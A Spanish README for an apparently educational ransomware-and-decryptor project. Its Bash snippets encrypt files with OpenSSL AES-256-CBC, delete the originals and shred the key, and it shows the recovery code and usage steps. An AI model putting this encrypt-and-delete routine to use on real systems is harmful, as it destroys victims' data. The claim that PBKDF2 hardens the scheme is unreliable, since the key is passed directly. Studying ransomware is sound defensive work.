# 🔐 Ransomware y AntiRansomware

> ⚠️ **ADVERTENCIA:** Repositorio con fines **exclusivamente educativos** para estudio de seguridad informática en entornos controlados (VirtualBox/VM). No me hago responsable del uso indebido.

Implementación didáctica de un ransomware y su cura, diseñada para entender cómo funcionan los ataques de cifrado de archivos y cómo revertirlos. Opera con criptografía real **AES-256-CBC** vía OpenSSL.

---

## ✨ Características

- 🔒 **Cifrado AES-256-CBC real** — OpenSSL con claves de 256 bits y IV único por archivo.
- 🧂 **IV embebido** — El IV se almacena en la primera línea del `.encrypted`, sin almacenamiento externo.
- 🛡️ **Límites de seguridad** — Solo opera en directorios específicos permitidos.
- ♻️ **Reversible al 100%** — El anti-ransomware recupera archivos originales con la clave correcta.
- 🗑️ **Destrucción segura** — Usa `shred` para eliminar la clave de forma irrecuperable.

---

## 🛠️ Stack

| Tecnología | Uso |
|---|---|
| Bash | Scripting principal |
| OpenSSL | Cifrado/descifrado AES-256-CBC |
| `shred` | Eliminación segura de archivos |
| Linux/Ubuntu | Plataforma objetivo |

---

## 🔬 Cómo Funciona el Cifrado

### Generación de clave y cifrado

```bash
# Generar clave aleatoria de 256 bits
key=$(openssl rand -hex 32)

encrypt_file() {
    local file="$1"
    local iv=$(openssl rand -hex 16)  # IV único por archivo

    # Cifrar con AES-256-CBC + PBKDF2 (10,000 iteraciones)
    openssl enc -aes-256-cbc -salt -in "$file" -out "$file.encrypted" \
        -K "$key" -iv "$iv" -pbkdf2 -iter 10000

    # Prepend IV al archivo cifrado: [IV]\n[datos_cifrados]
    local temp=$(mktemp)
    echo "$iv" > "$temp"
    cat "$file.encrypted" >> "$temp"
    mv "$temp" "$file.encrypted"

    rm "$file"  # Eliminar original
}
```

**¿Por qué IV único por archivo?** El mismo plaintext + misma clave + mismo IV produce el mismo ciphertext. Un IV aleatorio por archivo garantiza outputs diferentes, haciendo imposible la correlación.

### Destrucción segura de la clave

```bash
# shred sobreescribe múltiples veces antes de eliminar
# Hace la recuperación forense prácticamente imposible
shred -u key_temp.txt 2>/dev/null || rm -f key_temp.txt
```

---

## 💊 Anti-Ransomware

```bash
# 1. Extraer IV (primera línea)
iv=$(head -n 1 "$encrypted_file")

# 2. Extraer datos cifrados (resto del archivo)
tail -n +2 "$encrypted_file" > "$temp_encrypted"

# 3. Descifrar con el IV recuperado
openssl enc -aes-256-cbc -d \
    -in "$temp_encrypted" -out "$original_name" \
    -K "$key" -iv "$iv" -pbkdf2 -iter 10000
```

---

## 🧪 Uso (solo en VM aislada)

```bash
# Cifrar
chmod +x ransomware && ./ransomware
# OUTPUT: "la clave fue: a3f8c2..." → GUARDAR

# Descifrar
chmod +x antiransomware.sh && ./antiransomware.sh
# INPUT: ingresar la clave guardada
```

---

## 📚 Conceptos Aplicados

- **AES-256 CBC** — Cipher Block Chaining, cada bloque cifrado depende del anterior.
- **PBKDF2** — Key Derivation Function que hace el brute force inviable.
- **IV** — Garantiza que el mismo plaintext produce diferentes ciphertexts.

---

## 📄 Licencia

MIT — Solo uso educativo.